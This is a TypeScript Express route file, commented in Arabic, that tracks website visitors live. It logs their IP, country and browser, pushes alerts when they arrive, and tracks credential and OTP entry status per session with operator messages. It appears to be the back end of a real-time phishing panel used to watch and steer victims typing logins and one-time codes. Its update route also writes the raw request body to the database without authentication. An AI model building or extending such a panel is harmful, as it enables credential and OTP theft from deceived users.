// مسارات جلسات المستخدمين - تتبع الزوار في الوقت الحقيقي
import { Router } from "express";
import { db, sessionsTable, applicationsTable } from "@workspace/db";
import { eq, desc, sql, isNull } from "drizzle-orm";
import { broadcast } from "../lib/websocket";
import { sendPushNotification } from "../lib/push";

const router = Router();

// البحث عن الدولة من عنوان IP
async function lookupCountry(ip: string): Promise<string | null> {
  if (!ip || ip === "127.0.0.1" || ip === "::1" || ip.startsWith("192.168") || ip.startsWith("10.") || ip.startsWith("::ffff:127") || ip.startsWith("172.")) {
    return "محلي";
  }
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=country`, { signal: controller.signal });
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json() as { country?: string };
      return data.country || null;
    }
  } catch {
    // تجاهل خطأ البحث
  }
  return null;
}

// الحصول على جميع الجلسات غير المحذوفة مع اسم العميل إن وُجد
router.get("/", async (req, res) => {
  try {
    const sessions = await db
      .select({
        id: sessionsTable.id,
        ipAddress: sessionsTable.ipAddress,
        country: sessionsTable.country,
        userAgent: sessionsTable.userAgent,
        currentPage: sessionsTable.currentPage,
        applicationId: sessionsTable.applicationId,
        isActive: sessionsTable.isActive,
        isBlocked: sessionsTable.isBlocked,
        blockedReason: sessionsTable.blockedReason,
        pendingMessage: sessionsTable.pendingMessage,
        credentialsStatus: sessionsTable.credentialsStatus,
        credentialsMessage: sessionsTable.credentialsMessage,
        otpStatus: sessionsTable.otpStatus,
        lastSeenAt: sessionsTable.lastSeenAt,
        createdAt: sessionsTable.createdAt,
        applicantName: sql<string | null>`coalesce(${applicationsTable.fullName}, ${applicationsTable.companyName}, ${applicationsTable.contactName})`,
      })
      .from(sessionsTable)
      .leftJoin(applicationsTable, eq(applicationsTable.id, sessionsTable.applicationId))
      .where(isNull(sessionsTable.deletedAt))
      .orderBy(desc(sessionsTable.lastSeenAt));
    res.json(sessions);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الجلسات");
    res.status(500).json({ error: "فشل في جلب الجلسات" });
  }
});

// إنشاء جلسة جديدة للزائر
router.post("/", async (req, res) => {
  const { currentPage } = req.body;
  try {
    const sessionId = `sess_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
    const rawIp =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      req.socket.remoteAddress ||
      null;
    const userAgent = req.headers["user-agent"] || null;
    const country = rawIp ? await lookupCountry(rawIp) : null;

    const [session] = await db
      .insert(sessionsTable)
      .values({
        id: sessionId,
        ipAddress: rawIp,
        country,
        userAgent,
        currentPage: currentPage || "home",
      })
      .returning();

    broadcast({ type: "new_visitor", data: session });
    broadcast({ type: "session_update", data: session });
    
    // إرسال Push Notification للزائر الجديد
    sendPushNotification("visitor", { sessionId: session.id }).catch(err => req.log.error({ err }, "Push notification failed"));
    
    res.status(201).json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في إنشاء الجلسة");
    res.status(500).json({ error: "فشل في إنشاء الجلسة" });
  }
});

// الحصول على جلسة محددة
router.get("/:sessionId", async (req, res) => {
  try {
    const [session] = await db
      .select()
      .from(sessionsTable)
      .where(eq(sessionsTable.id, req.params.sessionId));
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });
    res.json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الجلسة");
    res.status(500).json({ error: "فشل في جلب الجلسة" });
  }
});

// تحديث بيانات الجلسة (الصفحة الحالية، حالة النشاط، إلخ)
router.patch("/:sessionId", async (req, res) => {
  const { sessionId } = req.params;
  try {
    const [session] = await db
      .update(sessionsTable)
      .set({
        ...req.body,
        lastSeenAt: new Date(),
      })
      .where(eq(sessionsTable.id, sessionId))
      .returning();
    if (!session) return res.status(404).json({ error: "الجلسة غير موجودة" });
    broadcast({ type: "session_update", data: session });
    if (req.body.currentPage === "credentials") {
      broadcast({ type: "credentials_enter", data: session });
    }
    res.json(session);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحديث الجلسة");
    res.status(500).json({ error: "فشل في تحديث الجلسة" });
  }
});

export default router;
